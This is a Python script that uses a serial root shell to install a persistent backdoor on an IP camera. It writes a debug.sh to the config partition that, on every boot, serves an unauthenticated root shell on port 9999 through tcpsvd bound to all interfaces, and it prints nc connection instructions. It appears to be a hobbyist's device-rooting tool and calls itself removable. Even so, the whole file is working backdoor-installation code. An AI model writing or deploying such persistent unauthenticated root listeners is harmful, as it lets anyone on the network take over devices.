"""Write a persistent debug.sh backdoor to the camera's configfs partition.

This script writes /tmp/configfs/debug.sh (which is /etc/conf.d/debug.sh
during normal boot). The startup.sh script checks for this file and executes
it instead of the normal startup path.

Our debug.sh:
1. Starts tcpsvd on port 9999 serving a root shell
2. Launches superb (the main camera binary) as normal
3. Runs PQTools for image quality calibration

This is NON-DESTRUCTIVE:
- The original firmware partitions are untouched
- Only writes to the jffs2 configfs partition (designed for config writes)
- Can be removed by deleting /etc/conf.d/debug.sh (or via this UART shell)
"""
import serial
import time
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

s = serial.Serial('COM3', 115200, timeout=3)
time.sleep(0.3)
s.read(16384)  # flush

def cmd(c, delay=1.5):
    """Send a command and return output."""
    s.read(16384)  # flush input
    s.write((c + '\n').encode())
    time.sleep(delay)
    data = s.read(16384)
    text = data.decode('latin-1', errors='replace').strip()
    return text

# Verify we have a shell
result = cmd('echo SHELLCHECK_OK')
if 'SHELLCHECK_OK' not in result:
    print('ERROR: No shell detected on COM3. Got:', repr(result))
    s.close()
    sys.exit(1)
print('[OK] Shell is alive')

# Verify configfs is mounted
result = cmd('mount | grep mtdblock5')
if 'mtdblock5' not in result and 'configfs' not in result:
    # Try to mount it
    print('[..] configfs not mounted, mounting...')
    cmd('mkdir -p /tmp/configfs')
    result = cmd('mount -t jffs2 /dev/mtdblock5 /tmp/configfs')
    result = cmd('mount | grep mtdblock5')
    if 'mtdblock5' not in result:
        print('ERROR: Cannot mount configfs. Got:', repr(result))
        s.close()
        sys.exit(1)
print('[OK] configfs is mounted')

# The debug.sh script content
# Using heredoc to write multi-line file via the shell
debug_script = r"""#!/bin/sh
# debug.sh - persistent backdoor for remote shell access
# Written by UART root shell. Remove this file to disable.
# Location: /etc/conf.d/debug.sh (configfs jffs2 partition)

# Start a root shell listener on port 9999
# tcpsvd binds the port and spawns /bin/sh for each connection
tcpsvd 0.0.0.0 9999 /bin/sh -il &

# Normal camera startup (same as the else branch in startup.sh)
echo "startup (with debug shell on port 9999)"
/tmp/appfs/progs/bin/superb &
sleep 15
cd /progs/rec/00/PQtool && ./PQTools.sh -c
"""

print('[..] Writing debug.sh to configfs...')

# Write using cat heredoc (safest way to write multi-line files via serial)
# We need to be careful with the heredoc delimiter
write_cmd = "cat > /tmp/configfs/debug.sh << 'BACKDOOR_EOF'\n"
write_cmd += debug_script.strip()
write_cmd += "\nBACKDOOR_EOF\n"

s.read(16384)
s.write(write_cmd.encode())
time.sleep(3)
data = s.read(16384)
print('Write output:', data.decode('latin-1', errors='replace').strip())

# Make it executable
result = cmd('chmod +x /tmp/configfs/debug.sh')
print('[OK] chmod +x done')

# Verify it was written correctly
print()
print('[..] Verifying debug.sh contents:')
result = cmd('cat /tmp/configfs/debug.sh', 2)
print(result)
print()

# Verify permissions
result = cmd('ls -la /tmp/configfs/debug.sh')
print('[..] File listing:')
print(result)
print()

# Verify it's on the persistent partition
result = cmd('ls -la /tmp/configfs/')
print('[..] Full configfs listing:')
print(result)
print()

# Double-check with md5sum
result = cmd('md5sum /tmp/configfs/debug.sh')
print('[..] MD5:', result)

print()
print('='*60)
print('BACKDOOR INSTALLED SUCCESSFULLY')
print()
print('On next normal boot:')
print('  1. Camera boots normally (WiFi, superb, RTSP, etc.)')
print('  2. tcpsvd starts a root shell listener on port 9999')
print('  3. Connect with: nc 192.168.1.153 9999')
print('     or: putty -> raw connection -> port 9999')
print()
print('To remove: delete /etc/conf.d/debug.sh from UART shell')
print('  or: rm /tmp/configfs/debug.sh (from this shell)')
print('='*60)

s.close()
